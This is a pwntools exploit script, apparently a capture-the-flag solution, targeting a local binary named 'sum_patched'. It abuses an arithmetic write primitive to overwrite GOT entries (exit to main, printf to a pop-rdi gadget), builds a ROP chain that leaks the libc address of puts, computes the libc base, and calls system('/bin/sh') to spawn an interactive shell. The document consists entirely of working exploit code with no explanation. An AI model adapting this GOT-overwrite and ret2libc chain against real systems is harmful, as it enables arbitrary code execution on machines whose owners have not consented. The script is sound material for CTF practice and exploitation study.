#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sum_patched')
libc = ELF('./libc.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

def overwrite(where: int, what: int) -> None:
    val = 0xfffffffffffffff0 // 4
    values = [ val - where, val, val, val + 15, what + 1, where ]
    send_values(values)

def send_values(values: list) -> None:
    io.recvuntil(b"2 3 4 0\n")
    for val in values:
        io.sendline(str(val).encode())

io = start()

overwrite(exe.got.exit, exe.sym.main)

pop_rdi = 0x400a43 # pop rdi; ret;
overwrite(exe.got.printf, pop_rdi)

values = [ pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main, 0 ]
send_values(values)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"got leak: {hex(leak)}")
libc.address = leak - libc.sym.puts
log.success(f"libc @ {hex(libc.address)}")

values = [
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.sym.system,
    exe.sym.main,
    0
]
send_values(values)

io.interactive()

